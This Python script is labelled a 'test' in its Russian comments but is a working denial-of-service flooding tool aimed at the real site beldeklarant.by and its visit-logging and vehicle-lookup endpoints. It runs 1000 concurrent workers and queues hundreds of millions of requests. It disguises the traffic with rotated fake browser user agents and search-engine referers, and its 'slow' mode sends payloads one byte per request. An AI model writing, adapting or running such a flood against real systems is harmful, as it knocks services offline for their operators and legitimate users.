import asyncio
import json
import random
import secrets
import string
import sys
import time
import uuid
from datetime import datetime, timezone

import aiohttp

# Список проверок: эндпоинты из примера скрипта
CHECKS = [
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True, "kind": "vehicles_list"},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True, "kind": "vehicles_list"},
    {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
    {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
]

MODE = "flood"  # slow | flood

if len(sys.argv) > 1:
    requested_mode = sys.argv[1].strip().lower()
    if requested_mode in {"slow", "flood"}:
        MODE = requested_mode

if MODE == "slow":
    TOTAL_REQUESTS = 500000000
    DELAY_BETWEEN_REQ = 0.001
    MAX_CONCURRENT = 1000
    JITTER = 0.0
    BYTE_RATE_PER_SECOND = 1
else:
    TOTAL_REQUESTS = 200000000
    DELAY_BETWEEN_REQ = 0.01
    MAX_CONCURRENT = 1000
    JITTER = 0.005
    BYTE_RATE_PER_SECOND = None


USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]


def build_payload(request_num: int, worker_id: int, check_cfg: dict) -> dict:
    iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")

    base_payload = {
        "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
        "page": f"/probe/{uuid.uuid4().hex[:12]}",
        "timestamp": iso_string,
        "userAgent": random.choice(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "acceptLanguage": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]),
        "acceptEncoding": "gzip, deflate, br",
        "referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/", "https://www.reddit.com/"]),
    }

    if check_cfg["kind"] == "log_visit":
        base_payload.update({
            "pageName": random.choice(["Главная", "ЗТК", "Контейнер", "ПТО"]),
            "event": "page_view",
            "screenWidth": random.randint(360, 1920),
            "screenHeight": random.randint(640, 1080),
        })
    elif check_cfg["kind"] == "vehicles_list":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "limit": 10,
            "offset": random.randint(0, 100),
        })
    elif check_cfg["kind"] == "vehicles_vin":
        base_payload.update({
            "endpoint": "/api/vehicles",
            "vin": random.choice(["W1K2060431R001488", "JTEBR3FJ20K191488", "WVWZZZ1JZ3W123456"]),
        })

    return base_payload


request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()


async def worker(session, worker_id):
    global request_counter, success_count, fail_count

    while True:
        async with counter_lock:
            if request_counter >= TOTAL_REQUESTS:
                break
            request_counter += 1
            current_request_num = request_counter

        check_cfg = CHECKS[(current_request_num - 1) % len(CHECKS)]
        payload = build_payload(current_request_num, worker_id, check_cfg)

        try:
            start_time = time.time()
            body = json.dumps(payload, ensure_ascii=False)

            if MODE == "slow":

                # Запоминаем время начала отправки всей последовательности байт
                start_time = time.time()

                # Используем сессию для удержания (переиспользования) соединения между запросами
                async with aiohttp.ClientSession() as session:
                    for idx, char in enumerate(body):
                        chunk = char.encode("utf-8")
                        
                        try:
                            async with session.request(
                                check_cfg["method"],
                                check_cfg["url"],
                                data=chunk,
                                timeout=5,
                                ssl=check_cfg["ssl"],
                            ) as response:
                                duration = time.time() - start_time
                                
                                if response.status in (200, 201):
                                    print(
                                        f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                        f" (Цель: {check_cfg['url']}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                                    )
                                    async with counter_lock:
                                        success_count += 1
                                else:
                                    print(
                                        f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                        f" Сервер вернул код {response.status} для {check_cfg['url']}"
                                    )
                                    async with counter_lock:
                                        fail_count += 1
                                        
                        except Exception as e:
                            print(f"[-] Ошибка соединения для воркера {worker_id}: {e}")
                            async with counter_lock:
                                fail_count += 1
                                
                        await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)

                for idx, char in enumerate(body):
                    chunk = char.encode("utf-8")
                    async with session.request(
                        check_cfg["method"],
                        check_cfg["url"],
                        data=chunk,
                        timeout=5,
                        ssl=check_cfg["ssl"],
                    ) as response:
                        duration = time.time() - start_time
                        if response.status in (200, 201):
                            print(
                                f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                                f" (Цель: {check_cfg['url']}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с, байт {idx + 1})"
                            )
                            async with counter_lock:
                                success_count += 1
                        else:
                            print(
                                f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                                f" Сервер вернул код {response.status} для {check_cfg['url']}"
                            )
                            async with counter_lock:
                                fail_count += 1
                    await asyncio.sleep(1.0 / BYTE_RATE_PER_SECOND)
            else:
                async with session.request(
                    check_cfg["method"],
                    check_cfg["url"],
                    json=payload,
                    timeout=5,
                    ssl=check_cfg["ssl"],
                ) as response:
                    duration = time.time() - start_time
                    if response.status in (200, 201):
                        print(
                            f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                            f" (Цель: {check_cfg['url']}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
                        )
                        async with counter_lock:
                            success_count += 1
                    else:
                        print(
                            f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                            f" Сервер вернул код {response.status} для {check_cfg['url']}"
                        )
                        async with counter_lock:
                            fail_count += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(
                f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
                f" ({e}) для {check_cfg['url']}"
            )
            async with counter_lock:
                fail_count += 1

        sleep_for = DELAY_BETWEEN_REQ + random.uniform(0, JITTER)
        await asyncio.sleep(sleep_for)


async def main():
    print("[*] Запуск асинхронного теста")
    print(f"[*] Режим: {MODE}")
    print(f"[*] Целей для проверки: {len(CHECKS)}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")

    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)

    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [
            asyncio.create_task(worker(session, worker_id))
            for worker_id in range(1, MAX_CONCURRENT + 1)
        ]
        await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")


if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())
